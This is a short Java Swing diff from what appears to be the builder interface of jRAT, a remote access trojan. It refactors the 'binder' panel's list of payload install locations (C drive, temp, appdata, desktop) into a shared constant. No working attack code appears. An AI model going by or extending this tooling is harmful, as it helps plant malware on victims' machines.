@@ -19,6 +19,7 @@ import javax.swing.JTextField;
 import javax.swing.LayoutStyle.ComponentPlacement;
 
 import se.jrat.client.Help;
+import se.jrat.common.DropLocations;
 
 
 @SuppressWarnings("serial")
@@ -77,7 +78,7 @@ public class PanelBuildBinder extends JPanel {
 		JLabel lblDropPath = new JLabel("Install path");
 
 		comboBox = new JComboBox<String>();
-		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "root/C drive", "temp/documents (UNIX)", "appdata", "desktop" }));
+		comboBox.setModel(new DefaultComboBoxModel<String>(DropLocations.STRINGS));
 
 		JLabel lblName = new JLabel("Name");
 
